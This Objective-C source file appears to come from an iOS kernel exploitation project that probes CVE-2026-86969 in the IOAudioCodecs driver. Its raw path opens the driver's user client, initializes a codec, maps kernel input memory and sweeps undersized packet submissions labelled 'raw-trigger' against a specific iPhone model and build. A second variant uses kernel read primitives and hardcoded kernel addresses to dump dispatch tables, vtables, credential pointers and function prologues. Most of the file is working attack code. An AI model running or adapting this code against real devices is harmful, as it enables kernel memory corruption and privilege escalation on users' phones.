#import "CNDAudioCodecs86969Probe.h"
#import <AudioToolbox/AudioToolbox.h>
#import <AVFoundation/AVFoundation.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <stdlib.h>
#import <string.h>
#import <sys/sysctl.h>
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/kutils.h"
#import "../kexploit/offsets.h"

// Selector map re-derived from the generic 24A446 kernelcache (docs/research/
// cve-2026-86969.md, Appendix B):
//   dispatch table __const 0xfffffe00082ecd50, 0x18-byte entries, sels 0-5
//   sel 2 = codec init (si=0, structIn=0x50, so=0, structOut=0)
//   sel 5 = packet submit (si=3, structIn=0, so=2, structOut=0)
//         inputs  = {inputOffset, inSize, outputOffset}
//         outputs = {updatedInSize, outCap}
//   clientMemoryForType(0) maps the wrapper's kernel input allocation. The
//   wrapper supplies its kernel output allocation and capacity internally.
//
// The constants below are retained solely for the pre-existing 23A341
// KRW-assisted diagnostic variant; the plain-app 24A446 raw path uses no KRW
// and no static kernel addresses.
// Addresses below are pre-slide statics in the same vmaddr scheme as
// CNDPhysicalKCall1Probe (kernel __TEXT base 0xfffffff007004000); live =
// static + (g_kernel_base - 0xfffffff007004000).

#define CND_A86969_STATIC_KERNEL_BASE UINT64_C(0xfffffff007004000)
#define CND_A86969_STATIC_DISPATCH    UINT64_C(0xfffffff008047638)
#define CND_A86969_STATIC_INST_VTABLE UINT64_C(0xfffffff008046fa8)
#define CND_A86969_STATIC_CODEC_VT8   UINT64_C(0xfffffff008048a50)
#define CND_A86969_STATIC_PROCESS     UINT64_C(0xfffffff003467bd8)
#define CND_A86969_PROCESS_LO32       UINT64_C(0x03467bd8)

#define CND_A86969_RAW_PRODUCT @"iPhone14,5"
#define CND_A86969_RAW_BUILD @"24A446"
#define CND_A86969_HEADER_FORMAT UINT32_C(0x63616333) // 'cac3'
#define CND_A86969_SELECTOR_OPEN 0
#define CND_A86969_SELECTOR_CLOSE 1
#define CND_A86969_SELECTOR_INITIALIZE 2
#define CND_A86969_SELECTOR_UNINITIALIZE 3
#define CND_A86969_SELECTOR_PACKET 5

typedef struct {
    AudioStreamBasicDescription input;
    AudioStreamBasicDescription output;
} CNDA86969InitializeRequest;

_Static_assert(sizeof(AudioStreamBasicDescription) == 0x28,
               "24A446 IOAudioCodecs expects a 0x28-byte ASBD");
_Static_assert(sizeof(CNDA86969InitializeRequest) == 0x50,
               "selector 2 expects two contiguous ASBDs");

static NSString *CNDKernReturnString(kern_return_t kr)
{
    return [NSString stringWithFormat:@"0x%x (%s)", kr,
            mach_error_string(kr) ?: "?"];
}

static NSString *CNDHex64(uint64_t v)
{
    return [NSString stringWithFormat:@"0x%llx", v];
}

static NSString *CNDA86969PlayerStatusString(AVPlayerItemStatus status)
{
    switch (status) {
        case AVPlayerItemStatusUnknown: return @"unknown";
        case AVPlayerItemStatusReadyToPlay: return @"ready";
        case AVPlayerItemStatusFailed: return @"failed";
    }
    return @"invalid";
}

static NSString *CNDA86969TimeControlStatusString(AVPlayerTimeControlStatus status)
{
    switch (status) {
        case AVPlayerTimeControlStatusPaused: return @"paused";
        case AVPlayerTimeControlStatusWaitingToPlayAtSpecifiedRate: return @"waiting";
        case AVPlayerTimeControlStatusPlaying: return @"playing";
    }
    return @"invalid";
}

static NSDictionary *CNDA86969AudioRouteSnapshot(void)
{
    AVAudioSession *session = [AVAudioSession sharedInstance];
    NSMutableArray *outputs = [NSMutableArray array];
    for (AVAudioSessionPortDescription *port in session.currentRoute.outputs) {
        NSMutableArray *channels = [NSMutableArray array];
        for (AVAudioSessionChannelDescription *channel in port.channels ?: @[]) {
            [channels addObject:@{
                @"name": channel.channelName ?: @"",
                @"number": @(channel.channelNumber),
            }];
        }
        [outputs addObject:@{
            @"name": port.portName ?: @"",
            @"type": port.portType ?: @"",
            @"uid": port.UID ?: @"",
            @"channels": channels,
        }];
    }
    return @{
        @"category": session.category ?: @"",
        @"mode": session.mode ?: @"",
        @"sampleRate": @(session.sampleRate),
        @"outputVolume": @(session.outputVolume),
        @"outputs": outputs,
    };
}

static void CNDA86969CollectRegistryChildren(
    io_registry_entry_t parent,
    uint64_t parentID,
    NSUInteger depth,
    NSMutableArray *children,
    NSUInteger *remaining)
{
    if (depth > 4 || *remaining == 0) return;

    io_iterator_t iterator = IO_OBJECT_NULL;
    kern_return_t kr = IORegistryEntryGetChildIterator(parent, kIOServicePlane,
                                                        &iterator);
    if (kr != KERN_SUCCESS) return;

    io_registry_entry_t child = IO_OBJECT_NULL;
    while (*remaining > 0 && (child = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
        (*remaining)--;
        io_name_t name = { 0 };
        (void)IORegistryEntryGetName(child, name);
        CFStringRef copiedClass = IOObjectCopyClass(child);
        NSString *className = CFBridgingRelease(copiedClass) ?: @"";
        uint64_t registryID = 0;
        (void)IORegistryEntryGetRegistryEntryID(child, &registryID);
        uint32_t busyState = 0;
        kern_return_t busyKR = IOServiceGetBusyState(child, &busyState);
        NSMutableDictionary *entry = [@{
            @"depth": @(depth),
            @"parentRegistryID": CNDHex64(parentID),
            @"registryID": CNDHex64(registryID),
            @"name": name[0] ? [NSString stringWithUTF8String:name] : @"",
            @"class": className,
            @"isUserClient": @(IOObjectConformsTo(child, "IOUserClient")),
            @"busyStateReturn": CNDKernReturnString(busyKR),
        } mutableCopy];
        if (busyKR == KERN_SUCCESS) entry[@"busyState"] = @(busyState);
        [children addObject:entry];
        CNDA86969CollectRegistryChildren(child, registryID, depth + 1,
                                         children, remaining);
        IOObjectRelease(child);
    }
    IOObjectRelease(iterator);
}

static NSDictionary *CNDA86969RegistrySnapshot(void)
{
    io_service_t service = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("IOAudioCodecs"));
    if (service == IO_OBJECT_NULL) {
        return @{ @"present": @NO };
    }

    uint64_t registryID = 0;
    (void)IORegistryEntryGetRegistryEntryID(service, &registryID);
    io_name_t name = { 0 };
    (void)IORegistryEntryGetName(service, name);
    CFStringRef copiedClass = IOObjectCopyClass(service);
    NSString *className = CFBridgingRelease(copiedClass) ?: @"";
    uint32_t busyState = 0;
    kern_return_t busyKR = IOServiceGetBusyState(service, &busyState);

    NSMutableArray *children = [NSMutableArray array];
    NSUInteger remaining = 96;
    CNDA86969CollectRegistryChildren(service, registryID, 1, children, &remaining);
    IOObjectRelease(service);

    NSMutableDictionary *snapshot = [@{
        @"present": @YES,
        @"registryID": CNDHex64(registryID),
        @"name": name[0] ? [NSString stringWithUTF8String:name] : @"",
        @"class": className,
        @"busyStateReturn": CNDKernReturnString(busyKR),
        @"children": children,
        @"childrenTruncated": @(remaining == 0),
    } mutableCopy];
    if (busyKR == KERN_SUCCESS) snapshot[@"busyState"] = @(busyState);
    return snapshot;
}

static NSArray *CNDA86969AccessLogEvents(AVPlayerItem *item)
{
    NSMutableArray *events = [NSMutableArray array];
    for (AVPlayerItemAccessLogEvent *event in item.accessLog.events ?: @[]) {
        [events addObject:@{
            @"uri": event.URI ?: @"",
            @"serverAddress": event.serverAddress ?: @"",
            @"mediaRequests": @(event.numberOfMediaRequests),
            @"bytesTransferred": @(event.numberOfBytesTransferred),
            @"indicatedBitrate": @(event.indicatedBitrate),
            @"observedBitrate": @(event.observedBitrate),
            @"stalls": @(event.numberOfStalls),
            @"durationWatched": @(event.durationWatched),
        }];
    }
    return events;
}

static NSArray *CNDA86969ErrorLogEvents(AVPlayerItem *item)
{
    NSMutableArray *events = [NSMutableArray array];
    for (AVPlayerItemErrorLogEvent *event in item.errorLog.events ?: @[]) {
        [events addObject:@{
            @"uri": event.URI ?: @"",
            @"domain": event.errorDomain ?: @"",
            @"statusCode": @(event.errorStatusCode),
            @"comment": event.errorComment ?: @"",
        }];
    }
    return events;
}

@interface CNDA86969PlaybackTrace : NSObject
@property(nonatomic, copy) void (^completion)(NSDictionary<NSString *, id> *);
@property(nonatomic, strong) AVPlayerItem *item;
@property(nonatomic, strong) AVPlayer *player;
@property(nonatomic, strong) NSMutableDictionary *report;
@property(nonatomic, strong) NSMutableArray *registryTransitions;
@property(nonatomic, copy) NSString *lastRegistrySignature;
@property(nonatomic, strong) NSDate *startedAt;
@property(nonatomic, strong) NSDate *playbackStartedAt;
@property(nonatomic) BOOL completed;
@property(nonatomic) BOOL playbackStarted;
@property(nonatomic) BOOL capturedDuring;
@property(nonatomic) double maxPlaybackSeconds;
@property(nonatomic) NSUInteger pollCount;
- (void)start;
@end

@implementation CNDA86969PlaybackTrace

- (void)recordRegistrySnapshot:(NSDictionary *)snapshot elapsed:(NSTimeInterval)elapsed
{
    NSData *encoded = [NSJSONSerialization dataWithJSONObject:snapshot
                                                       options:NSJSONWritingSortedKeys
                                                         error:nil];
    NSString *signature = encoded != nil
        ? [[NSString alloc] initWithData:encoded encoding:NSUTF8StringEncoding]
        : snapshot.description;
    if (![signature isEqualToString:self.lastRegistrySignature]) {
        [self.registryTransitions addObject:@{
            @"elapsedSeconds": @(elapsed),
            @"snapshot": snapshot,
        }];
        self.lastRegistrySignature = signature;
    }
}

- (void)finishWithResult:(NSString *)result
{
    if (self.completed) return;
    self.completed = YES;
    [self.player pause];

    self.report[@"result"] = result;
    self.report[@"pollCount"] = @(self.pollCount);
    self.report[@"playbackStarted"] = @(self.playbackStarted);
    self.report[@"maxPlaybackSeconds"] = @(self.maxPlaybackSeconds);
    self.report[@"playerItemStatus"] = CNDA86969PlayerStatusString(self.item.status);
    self.report[@"timeControlStatus"] = CNDA86969TimeControlStatusString(
        self.player.timeControlStatus);
    self.report[@"accessLog"] = CNDA86969AccessLogEvents(self.item);
    self.report[@"errorLog"] = CNDA86969ErrorLogEvents(self.item);
    if (self.item.error != nil) {
        self.report[@"playerError"] = self.item.error.localizedDescription ?: @"";
    }
    self.report[@"audioRouteBeforeDeactivation"] = CNDA86969AudioRouteSnapshot();

    NSError *deactivationError = nil;
    BOOL deactivated = [[AVAudioSession sharedInstance]
        setActive:NO
        withOptions:AVAudioSessionSetActiveOptionNotifyOthersOnDeactivation
        error:&deactivationError];
    self.report[@"audioSessionDeactivated"] = @(deactivated);
    if (deactivationError != nil) {
        self.report[@"audioSessionDeactivationError"] =
            deactivationError.localizedDescription ?: @"";
    }

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        NSDictionary *after = CNDA86969RegistrySnapshot();
        self.report[@"registryAfter"] = after;
        [self recordRegistrySnapshot:after
                             elapsed:-[self.startedAt timeIntervalSinceNow]];
        self.report[@"registryTransitions"] = self.registryTransitions;
        self.report[@"audioRouteAfter"] = CNDA86969AudioRouteSnapshot();
        self.completion([self.report copy]);
        self.player = nil;
        self.item = nil;
        self.completion = nil;
    });
}

- (void)poll
{
    if (self.completed) return;
    NSTimeInterval elapsed = -[self.startedAt timeIntervalSinceNow];
    self.pollCount++;

    NSDictionary *registry = CNDA86969RegistrySnapshot();
    [self recordRegistrySnapshot:registry elapsed:elapsed];

    AVPlayerItemStatus itemStatus = self.item.status;
    if (itemStatus == AVPlayerItemStatusFailed) {
        [self finishWithResult:@"playback-failed"];
        return;
    }
    if (!self.playbackStarted && itemStatus == AVPlayerItemStatusReadyToPlay) {
        self.playbackStarted = YES;
        self.playbackStartedAt = [NSDate date];
        [self.player play];
    }

    double seconds = CMTimeGetSeconds(self.player.currentTime);
    if (isfinite(seconds) && seconds > self.maxPlaybackSeconds) {
        self.maxPlaybackSeconds = seconds;
    }
    if (!self.capturedDuring && seconds >= 0.5) {
        self.capturedDuring = YES;
        self.report[@"registryDuring"] = registry;
        self.report[@"audioRouteDuring"] = CNDA86969AudioRouteSnapshot();
    }

    if (self.playbackStarted &&
        -[self.playbackStartedAt timeIntervalSinceNow] >= 12.0) {
        NSString *result = self.maxPlaybackSeconds >= 1.0
            ? @"valid-eac3-playback-observed" : @"playback-started-no-progress";
        [self finishWithResult:result];
        return;
    }
    if (elapsed >= 30.0) {
        [self finishWithResult:@"playback-timeout"];
        return;
    }

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{ [self poll]; });
}

- (void)start
{
    self.startedAt = [NSDate date];
    self.registryTransitions = [NSMutableArray array];
    NSDictionary *before = CNDA86969RegistrySnapshot();
    self.report[@"registryBefore"] = before;
    [self recordRegistrySnapshot:before elapsed:0];
    self.report[@"audioRouteBefore"] = CNDA86969AudioRouteSnapshot();

    AVAudioSession *session = [AVAudioSession sharedInstance];
    NSError *sessionError = nil;
    BOOL configured = [session setCategory:AVAudioSessionCategoryPlayback
                                      mode:AVAudioSessionModeMoviePlayback
                                   options:0
                                     error:&sessionError];
    self.report[@"audioSessionConfigured"] = @(configured);
    if (configured) {
        configured = [session setActive:YES error:&sessionError];
        self.report[@"audioSessionActivated"] = @(configured);
    }
    if (!configured) {
        self.report[@"audioSessionError"] = sessionError.localizedDescription ?: @"";
        [self finishWithResult:@"audio-session-failed"];
        return;
    }

    NSURL *url = [NSURL URLWithString:self.report[@"streamURL"]];
    self.item = [AVPlayerItem playerItemWithURL:url];
    self.player = [AVPlayer playerWithPlayerItem:self.item];
    self.player.automaticallyWaitsToMinimizeStalling = YES;
    [self poll];
}

@end

void CNDAudioCodecs86969PlaybackTraceRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    NSCParameterAssert(completion != nil);
    dispatch_async(dispatch_get_main_queue(), ^{
        CNDA86969PlaybackTrace *trace = [CNDA86969PlaybackTrace new];
        trace.completion = completion;
        trace.report = [@{
            @"command": @"a86969-playback-benign",
            @"pid": @(getpid()),
            @"at": @([[NSDate date] timeIntervalSince1970]),
            @"streamFormat": @"E-AC-3 (ec-3), Apple public HLS sample",
            @"streamURL": @"https://devstreaming-cdn.apple.com/videos/streaming/examples/adv_dv_atmos/Job932393e2-1e4f-4fdb-ab59-0d201f752656-107660254-Transcode_audio_full_en_atmos_0_1-en_audio/prog_index.m3u8",
            @"krwAcquisitionAttempted": @NO,
            @"kernelReadUsed": @NO,
            @"kernelWriteUsed": @NO,
            @"directUserClientOpenUsed": @NO,
            @"malformedInputUsed": @NO,
        } mutableCopy];
        [trace start];
    });
}

static NSString *CNDA86969SysctlString(const char *name)
{
    size_t length = 0;
    if (sysctlbyname(name, NULL, &length, NULL, 0) != 0 || length == 0) {
        return @"";
    }
    char *value = calloc(1, length + 1);
    if (value == NULL) return @"";
    NSString *result = @"";
    if (sysctlbyname(name, value, &length, NULL, 0) == 0) {
        value[length] = '\0';
        result = [NSString stringWithUTF8String:value] ?: @"";
    }
    free(value);
    return result;
}

static void CNDA86969RecordKernReturn(
    NSMutableDictionary *rep,
    NSString *operation,
    kern_return_t kr,
    NSDictionary *extra)
{
    NSMutableArray *calls = rep[@"calls"];
    if (![calls isKindOfClass:NSMutableArray.class]) {
        calls = [NSMutableArray array];
        rep[@"calls"] = calls;
    }
    NSMutableDictionary *entry = [@{
        @"operation": operation,
        @"kernReturn": @((uint32_t)kr),
        @"return": CNDKernReturnString(kr),
        @"at": @([[NSDate date] timeIntervalSince1970]),
    } mutableCopy];
    if (extra != nil) [entry addEntriesFromDictionary:extra];
    [calls addObject:entry];
    NSLog(@"[A86969_RAW] %@ -> %@", operation, CNDKernReturnString(kr));
}

static BOOL CNDA86969PersistRawAttempt(NSMutableDictionary *rep)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *path = [directory stringByAppendingPathComponent:
        @"a86969-raw-attempt.json"];
    rep[@"attemptReportPath"] = path;

    NSMutableDictionary *snapshot = [rep mutableCopy];
    snapshot[@"persistedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSError *error = nil;
    NSData *data = [NSJSONSerialization dataWithJSONObject:snapshot
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:&error];
    BOOL saved = data != nil && [data writeToFile:path
        options:NSDataWritingAtomic error:&error];
    if (!saved) {
        rep[@"attemptReportError"] = error.localizedDescription ?: @"unknown";
    }
    return saved;
}

static AudioStreamBasicDescription CNDA86969HeaderASBD(void)
{
    AudioStreamBasicDescription asbd = { 0 };
    asbd.mSampleRate = 48000.0;
    asbd.mFormatID = CND_A86969_HEADER_FORMAT;
    asbd.mFormatFlags = 0x0c;
    asbd.mBytesPerPacket = 0x1800;
    asbd.mFramesPerPacket = 0x600;
    asbd.mBytesPerFrame = 4;
    asbd.mChannelsPerFrame = 2;
    asbd.mBitsPerChannel = 16;
    return asbd;
}

static kern_return_t CNDA86969CallPacket(
    io_connect_t conn,
    uint64_t inSize,
    NSString *phase,
    BOOL persistBeforeCall,
    NSMutableDictionary *rep)
{
    uint64_t scalarInput[3] = { 0, inSize, 0 };
    uint64_t scalarOutput[2] = { 0, 0 };
    uint32_t scalarOutputCount = 2;

    NSMutableDictionary *attempt = [@{
        @"phase": phase,
        @"selector": @(CND_A86969_SELECTOR_PACKET),
        @"inputOffset": @0,
        @"inSize": @(inSize),
        @"outputOffset": @0,
        @"status": @"calling",
        @"at": @([[NSDate date] timeIntervalSince1970]),
    } mutableCopy];
    NSMutableArray *attempts = rep[@"packetAttempts"];
    if (![attempts isKindOfClass:NSMutableArray.class]) {
        attempts = [NSMutableArray array];
        rep[@"packetAttempts"] = attempts;
    }
    [attempts addObject:attempt];
    rep[@"lastPacketAttempt"] = attempt;
    if (persistBeforeCall) {
        rep[@"result"] = @"armed-raw-selector-5-call";
        rep[@"cleanupVerdict"] = @"not-reached-trigger-call";
        (void)CNDA86969PersistRawAttempt(rep);
    }
    NSLog(@"[A86969_RAW] calling selector 5 phase=%@ inSize=%llu",
          phase, (unsigned long long)inSize);

    kern_return_t kr = IOConnectCallScalarMethod(
        conn, CND_A86969_SELECTOR_PACKET,
        scalarInput, 3, scalarOutput, &scalarOutputCount);
    attempt[@"status"] = @"returned";
    attempt[@"kernReturn"] = @((uint32_t)kr);
    attempt[@"return"] = CNDKernReturnString(kr);
    attempt[@"scalarOutputCount"] = @(scalarOutputCount);
    if (scalarOutputCount > 0) attempt[@"updatedInSize"] = @(scalarOutput[0]);
    if (scalarOutputCount > 1) attempt[@"outCap"] = @(scalarOutput[1]);
    CNDA86969RecordKernReturn(rep, @"selector-5-packet", kr, @{
        @"phase": phase,
        @"inSize": @(inSize),
        @"scalarOutputCount": @(scalarOutputCount),
    });
    if (persistBeforeCall) (void)CNDA86969PersistRawAttempt(rep);
    return kr;
}

static void CNDA86969Cleanup(
    io_connect_t conn,
    mach_vm_address_t inputAddress,
    mach_vm_size_t inputSize,
    BOOL initialized,
    BOOL codecOpened,
    NSMutableDictionary *rep)
{
    kern_return_t kr = KERN_SUCCESS;
    BOOL cleanupSucceeded = YES;
    if (inputAddress != 0) {
        kr = IOConnectUnmapMemory64(conn, 0, mach_task_self(), inputAddress);
        cleanupSucceeded &= kr == KERN_SUCCESS;
        CNDA86969RecordKernReturn(rep, @"unmap-input-memory-type-0", kr,
                                 @{ @"mappedSize": @(inputSize) });
    }
    if (initialized) {
        kr = IOConnectCallScalarMethod(
            conn, CND_A86969_SELECTOR_UNINITIALIZE, NULL, 0, NULL, NULL);
        cleanupSucceeded &= kr == KERN_SUCCESS;
        CNDA86969RecordKernReturn(rep, @"selector-3-uninitialize", kr, nil);
    }
    if (codecOpened) {
        kr = IOConnectCallScalarMethod(
            conn, CND_A86969_SELECTOR_CLOSE, NULL, 0, NULL, NULL);
        cleanupSucceeded &= kr == KERN_SUCCESS;
        CNDA86969RecordKernReturn(rep, @"selector-1-close", kr, nil);
    }
    kr = IOServiceClose(conn);
    cleanupSucceeded &= kr == KERN_SUCCESS;
    CNDA86969RecordKernReturn(rep, @"IOServiceClose", kr, nil);
    rep[@"cleanupVerdict"] = cleanupSucceeded
        ? @"completed" : @"completed-with-errors";
}

// Shared core: open the provider, initialize two exact 0x28-byte 'cac3'
// ASBDs, map the wrapper's input allocation, then drive selector 5 using
// offsets. A plain app is expected to stop at IOServiceOpen if sandbox policy
// denies IOAudioCodecsUserClient; that denial is retained as the result.
static void CNDAudioCodecs86969RunCore(
    BOOL benign,
    NSMutableDictionary *rep)
{
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                                                    IOServiceMatching("IOAudioCodecs"));
    if (!svc) {
        rep[@"result"] = @"no-IOAudioCodecs-service";
        rep[@"cleanupVerdict"] = @"not-required-no-service";
        return;
    }
    uint64_t registryID = 0;
    (void)IORegistryEntryGetRegistryEntryID(svc, &registryID);
    rep[@"serviceRegistryID"] = CNDHex64(registryID);

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    CNDA86969RecordKernReturn(rep, @"IOServiceOpen", kr, nil);
    if (kr != KERN_SUCCESS) {
        rep[@"result"] = kr == kIOReturnNotPermitted
            ? @"open-failed-sandbox-not-permitted" : @"open-failed";
        rep[@"stoppedBeforeInitialization"] = @YES;
        rep[@"cleanupVerdict"] = @"not-required-open-failed";
        if (!benign) (void)CNDA86969PersistRawAttempt(rep);
        return;
    }

    kr = IOConnectCallScalarMethod(
        conn, CND_A86969_SELECTOR_OPEN, NULL, 0, NULL, NULL);
    CNDA86969RecordKernReturn(rep, @"selector-0-open", kr, nil);
    if (kr != KERN_SUCCESS) {
        rep[@"result"] = @"selector-0-open-failed";
        CNDA86969Cleanup(conn, 0, 0, NO, NO, rep);
        if (!benign) (void)CNDA86969PersistRawAttempt(rep);
        return;
    }

    CNDA86969InitializeRequest request = { 0 };
    request.input = CNDA86969HeaderASBD();
    request.output = request.input;
    rep[@"initializeRequest"] = @{
        @"structureBytes": @(sizeof(request)),
        @"inputASBDBytes": @(sizeof(request.input)),
        @"formatID": @"cac3 (0x63616333)",
        @"sampleRate": @(request.input.mSampleRate),
        @"formatFlags": @(request.input.mFormatFlags),
        @"bytesPerPacket": @(request.input.mBytesPerPacket),
        @"framesPerPacket": @(request.input.mFramesPerPacket),
        @"bytesPerFrame": @(request.input.mBytesPerFrame),
        @"channelsPerFrame": @(request.input.mChannelsPerFrame),
        @"bitsPerChannel": @(request.input.mBitsPerChannel),
    };
    kr = IOConnectCallStructMethod(
        conn, CND_A86969_SELECTOR_INITIALIZE,
        &request, sizeof(request), NULL, NULL);
    CNDA86969RecordKernReturn(rep, @"selector-2-initialize", kr,
                             @{ @"structureInputSize": @(sizeof(request)) });
    if (kr != KERN_SUCCESS) {
        rep[@"result"] = @"selector-2-initialize-failed";
        CNDA86969Cleanup(conn, 0, 0, NO, YES, rep);
        if (!benign) (void)CNDA86969PersistRawAttempt(rep);
        return;
    }

    mach_vm_address_t inputAddress = 0;
    mach_vm_size_t inputMapSize = 0;
    kr = IOConnectMapMemory64(conn, 0, mach_task_self(),
                              &inputAddress, &inputMapSize, kIOMapAnywhere);
    CNDA86969RecordKernReturn(rep, @"map-input-memory-type-0", kr,
                             @{ @"mappedSize": @(inputMapSize) });
    if (kr != KERN_SUCCESS || inputAddress == 0 || inputMapSize < 0x20) {
        rep[@"result"] = kr == KERN_SUCCESS
            ? @"input-map-too-small" : @"input-map-failed";
        CNDA86969Cleanup(conn, inputAddress, inputMapSize, YES, YES, rep);
        if (!benign) (void)CNDA86969PersistRawAttempt(rep);
        return;
    }

    uint8_t *input = (uint8_t *)(uintptr_t)inputAddress;
    memset(input, 0, (size_t)MIN(inputMapSize, (mach_vm_size_t)0x40));
    input[8] = 0x0b;
    input[9] = 0x77;
    rep[@"mappedInputSize"] = @(inputMapSize);
    rep[@"syncWordOffset"] = @8;
    rep[@"syncWord"] = @"0b77";

    const uint64_t controlSizes[] = { 10, 0x20 };
    NSUInteger controlCount = benign ? 1 : 2;
    for (NSUInteger i = 0; i < controlCount; i++) {
        uint64_t controlSize = benign ? 0x20 : controlSizes[i];
        kr = CNDA86969CallPacket(conn, controlSize, @"control", NO, rep);
        if (kr != KERN_SUCCESS) {
            rep[@"result"] = @"selector-5-control-failed";
            CNDA86969Cleanup(conn, inputAddress, inputMapSize, YES, YES, rep);
            if (!benign) (void)CNDA86969PersistRawAttempt(rep);
            return;
        }
    }

    if (benign) {
        rep[@"result"] = @"control-packet-accepted";
    } else {
        rep[@"rawSweep"] = @{ @"order": @"7-to-0",
                               @"expectedFirstDecisiveSize": @7 };
        BOOL returnedSuccess = NO;
        for (NSInteger inSize = 7; inSize >= 0; inSize--) {
            kr = CNDA86969CallPacket(conn, (uint64_t)inSize,
                                     @"raw-trigger", YES, rep);
            if (kr == KERN_SUCCESS) {
                returnedSuccess = YES;
                break;
            }
        }
        rep[@"result"] = returnedSuccess
            ? @"raw-trigger-returned-success"
            : @"raw-sweep-returned-errors";
    }

    CNDA86969Cleanup(conn, inputAddress, inputMapSize, YES, YES, rep);
    if (!benign) (void)CNDA86969PersistRawAttempt(rep);
}

void CNDAudioCodecs86969ProbeRun(
    BOOL benign,
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    NSCParameterAssert(completion != nil);
    NSString *product = CNDA86969SysctlString("hw.machine");
    NSString *hardwareModel = CNDA86969SysctlString("hw.model");
    NSString *build = CNDA86969SysctlString("kern.osversion");
    NSString *bootSession = CNDA86969SysctlString("kern.bootsessionuuid");
    NSMutableDictionary *rep =
        [@{ @"command": benign ? @"a86969-benign" : @"a86969-raw",
            @"schema": @"com.zeroxjf.cyanide.a86969-raw",
            @"schemaVersion": @1,
            @"pid": @(getpid()),
            @"bundleIdentifier": NSBundle.mainBundle.bundleIdentifier ?: @"",
            @"productType": product,
            @"hardwareModel": hardwareModel,
            @"productBuildVersion": build,
            @"bootSessionUUID": bootSession,
            @"expectedProductType": CND_A86969_RAW_PRODUCT,
            @"expectedProductBuildVersion": CND_A86969_RAW_BUILD,
            @"selectorCorpusSHA256": @"45a04444d76557d9c6ec7beb862d16d3cc72b98ddf48f856d58eaca05715232f",
            @"processContext": @"stock-development-signed-plain-app",
            @"activePrimitiveGeneration": @"none",
            @"krwAcquisitionAttempted": @NO,
            @"kernelReadUsed": @NO,
            @"kernelWriteUsedOutsideBug": @NO,
            @"kernelCallUsed": @NO,
            @"taskPortUsed": @NO,
            @"evidenceClass": @"implemented-not-run",
            @"at": @([[NSDate date] timeIntervalSince1970]),
            @"calls": [NSMutableArray array],
            @"packetAttempts": [NSMutableArray array] } mutableCopy];

    BOOL exactTarget = [product isEqualToString:CND_A86969_RAW_PRODUCT] &&
        [build isEqualToString:CND_A86969_RAW_BUILD];
    rep[@"exactTargetMatched"] = @(exactTarget);
    if (!exactTarget) {
        rep[@"result"] = @"refused-exact-target-mismatch";
        rep[@"cleanupVerdict"] = @"not-required-target-mismatch";
        if (!benign) (void)CNDA86969PersistRawAttempt(rep);
        completion(rep);
        return;
    }
    CNDAudioCodecs86969RunCore(benign, rep);
    completion(rep);
}

// ---------------------------------------------------------------------------
// KRW-assisted variant
// ---------------------------------------------------------------------------

static uint64_t CNDA86969UcredOf(uint64_t proc)
{
    // Mirror proc_get_cred_label's raw first two hops.
    uint64_t p_proc_ro = kread64(proc + off_proc_p_proc_ro);
    uint64_t ucred = kread64(p_proc_ro + off_proc_ro_p_ucred);
    return ucred;
}

static void CNDA86969Recon(NSMutableDictionary *rep, uint64_t slide)
{
    rep[@"kernelBase"] = CNDHex64(g_kernel_base);
    rep[@"slide"] = CNDHex64(slide);

    // externalMethod dispatch table: 6 x 0x18-byte entries.
    uint8_t disp[6 * 0x18];
    memset(disp, 0, sizeof(disp));
    kreadbuf(CND_A86969_STATIC_DISPATCH + slide, disp, sizeof(disp));
    NSMutableArray *entries = [NSMutableArray array];
    for (int i = 0; i < 6; i++) {
        uint64_t raw;
        memcpy(&raw, disp + i * 0x18, 8);
        uint32_t si, sti;
        memcpy(&si, disp + i * 0x18 + 8, 4);
        memcpy(&sti, disp + i * 0x18 + 12, 4);
        [entries addObject:@{ @"sel": @(i),
                              @"funcRaw": CNDHex64(raw),
                              @"funcLo32": CNDHex64(raw & 0xffffffffULL),
                              @"si": @(si), @"sti": @(sti) }];
    }
    rep[@"dispatch"] = entries;

    // Instance vtable slots +0x5d0..+0x5f8 (sel 0..5 impls).
    uint64_t vt[6];
    memset(vt, 0, sizeof(vt));
    kreadbuf(CND_A86969_STATIC_INST_VTABLE + slide + 0x5d0, vt, sizeof(vt));
    NSMutableArray *vslots = [NSMutableArray array];
    for (int i = 0; i < 6; i++) {
        [vslots addObject:@{ @"slot": @(0x5d0 + 8 * i),
                             @"raw": CNDHex64(vt[i]),
                             @"lo32": CNDHex64(vt[i] & 0xffffffffULL) }];
    }
    rep[@"instVtableSlots"] = vslots;

    // Codec vtable slot 8 -> ProcessSinglePacket.
    uint64_t slot8raw = kread64(CND_A86969_STATIC_CODEC_VT8 + slide);
    uint64_t slot8ptr = kread_ptr(CND_A86969_STATIC_CODEC_VT8 + slide);
    rep[@"codecVtSlot8Raw"] = CNDHex64(slot8raw);
    rep[@"codecVtSlot8Ptr"] = CNDHex64(slot8ptr);
    rep[@"codecVtSlot8MatchesProcess"] =
        @((slot8ptr & 0xffffffffULL) == (CND_A86969_PROCESS_LO32 + slide));

    // First instructions of ProcessSinglePacket (expect pacibsp prologue).
    uint8_t prologue[16];
    memset(prologue, 0, sizeof(prologue));
    kreadbuf(CND_A86969_STATIC_PROCESS + slide, prologue, sizeof(prologue));
    NSMutableArray *words = [NSMutableArray array];
    for (int i = 0; i < 4; i++) {
        uint32_t w;
        memcpy(&w, prologue + i * 4, 4);
        [words addObject:[NSString stringWithFormat:@"0x%08x", w]];
    }
    rep[@"processPrologue"] = words;
}

